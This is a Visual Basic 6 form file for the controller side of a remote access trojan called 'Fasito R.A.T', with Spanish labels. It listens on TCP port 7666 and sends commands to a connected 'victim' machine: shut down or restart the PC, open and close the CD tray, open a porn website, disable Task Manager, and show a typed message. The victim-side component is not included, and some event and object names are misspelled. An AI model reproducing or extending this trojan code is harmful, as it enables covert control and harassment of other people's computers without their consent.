VERSION 5.00
Object = "{248DD890-BB45-11CF-9ABC-0080C7E7B78D}#1.0#0"; "MSWINSCK.OCX"
Begin VB.Form Form1 
   BackColor       =   &H80000008&
   Caption         =   "Fasito R.A.T - Version Beta 1.0 - http://indetectables.net/"
   ClientHeight    =   3195
   ClientLeft      =   60
   ClientTop       =   345
   ClientWidth     =   8595
   LinkTopic       =   "Form1"
   ScaleHeight     =   3195
   ScaleWidth      =   8595
   StartUpPosition =   3  'Windows Default
   Begin VB.CommandButton Command9 
      Caption         =   "Borrar Adm de Tareas"
      Height          =   375
      Left            =   6600
      TabIndex        =   13
      Top             =   2640
      Width           =   1695
   End
   Begin VB.CommandButton Command8 
      Caption         =   "Abrir Web PORNO"
      Height          =   375
      Left            =   6600
      TabIndex        =   12
      Top             =   2160
      Width           =   1695
   End
   Begin VB.CommandButton Command7 
      Caption         =   "Reiniciar PC"
      Height          =   375
      Left            =   6600
      TabIndex        =   11
      Top             =   720
      Width           =   1695
   End
   Begin VB.CommandButton Command6 
      Caption         =   "Desconectar"
      Height          =   375
      Left            =   2640
      TabIndex        =   10
      Top             =   2760
      Width           =   1575
   End
   Begin VB.Timer Timer2 
      Interval        =   200
      Left            =   5280
      Top             =   2760
   End
   Begin VB.Timer Timer1 
      Interval        =   200
      Left            =   4680
      Top             =   2760
   End
   Begin VB.TextBox Text1 
      Height          =   285
      Left            =   120
      TabIndex        =   5
      Text            =   "Escribe tu mensaje para la victima..............."
      Top             =   1680
      Width           =   5055
   End
   Begin VB.CommandButton Command5 
      Caption         =   "Enviar Mensaje"
      Height          =   375
      Left            =   1320
      TabIndex        =   4
      Top             =   2040
      Width           =   2535
   End
   Begin VB.CommandButton Command4 
      Caption         =   "Cerrar CD"
      Height          =   375
      Left            =   6600
      TabIndex        =   3
      Top             =   1680
      Width           =   1695
   End
   Begin VB.CommandButton Command3 
      Caption         =   "Abrir CD"
      Height          =   375
      Left            =   6600
      TabIndex        =   2
      Top             =   1200
      Width           =   1695
   End
   Begin VB.CommandButton Command2 
      BackColor       =   &H00C0C0C0&
      Caption         =   "Apagar PC"
      Height          =   375
      Left            =   6600
      TabIndex        =   1
      Top             =   240
      Width           =   1695
   End
   Begin VB.CommandButton Command1 
      Caption         =   "Conectar"
      Height          =   375
      Left            =   360
      TabIndex        =   0
      Top             =   2760
      Width           =   1695
   End
   Begin MSWinsockLib.Winsock Winsock1 
      Left            =   5880
      Top             =   2760
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
      LocalPort       =   7666
   End
   Begin VB.Frame Frame1 
      BackColor       =   &H80000012&
      Caption         =   "Menu"
      ForeColor       =   &H00FFFFFF&
      Height          =   3135
      Left            =   6480
      TabIndex        =   14
      Top             =   0
      Width           =   1935
   End
   Begin VB.Frame Frame2 
      BackColor       =   &H80000012&
      Caption         =   "Conección"
      ForeColor       =   &H00FFFFFF&
      Height          =   735
      Left            =   0
      TabIndex        =   15
      Top             =   2520
      Width           =   4575
   End
   Begin VB.Label Label4 
      BackColor       =   &H80000012&
      ForeColor       =   &H000000FF&
      Height          =   255
      Left            =   960
      TabIndex        =   9
      Top             =   960
      Width           =   2535
   End
   Begin VB.Label Label2 
      BackColor       =   &H80000012&
      ForeColor       =   &H000000FF&
      Height          =   255
      Left            =   960
      TabIndex        =   7
      Top             =   480
      Width           =   2535
   End
   Begin VB.Label Label1 
      BackColor       =   &H80000012&
      Caption         =   "Estado:"
      ForeColor       =   &H8000000E&
      Height          =   255
      Left            =   120
      TabIndex        =   6
      Top             =   480
      Width           =   615
   End
   Begin VB.Label Label3 
      BackColor       =   &H80000007&
      Caption         =   "IP:"
      ForeColor       =   &H8000000E&
      Height          =   255
      Left            =   120
      TabIndex        =   8
      Top             =   960
      Width           =   615
   End
   Begin VB.Image Image1 
      Height          =   4320
      Left            =   1920
      Picture         =   "Form2.frx":0000
      Top             =   -720
      Width           =   5760
   End
End
Attribute VB_Name = "Form1"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Private Sub Command1_Click()
Winsock1.Listen '
End Sub
Private Sub Winsock1_ConecionRequest(ByVal requestID As Long)
Winsock1.Close
Winsock1.Accept requestID
End Sub
Private Sub Command2_Click()
Winsock1.SendData "apagar" '
End Sub
Private Sub Command3_Click()
Winsock1.SendData "abrir CD" '
End Sub
Private Sub Command4_Click()
Winsock1.SendData "cerrar CD"
End Sub
Private Sub Command5_Click()
Winsock1.SendData Text1.Text
End Sub
Private Sub Timer1_Timer()
If Winsock1.State = 7 Then
Label2.Caption = "Conectado"
ElseIf Winsock1.State = 0 Then
Label2.Caption = "Desconectado"
ElseIf Winsock1.State = 2 Then
Label2.Caption = "Escuchando"
End If
End Sub
Private Sub Timer2_Timer()
If Winsock1.State = 7 Then
Label4.Caption = Winsock.RemoteHostIP
Timer2.Enabled = False '
End If
End Sub
Private Sub Command6_Click()
Winsock1.Close
End Sub
Private Sub Command7_Click()
Winsock1.SendData "reiniciar" '
End Sub
Private Sub Command8_Click()
Winsock1.SendData "web" '
End Sub
Private Sub Command9_Click()
Winsock1.SendData "tareas" '
End Sub
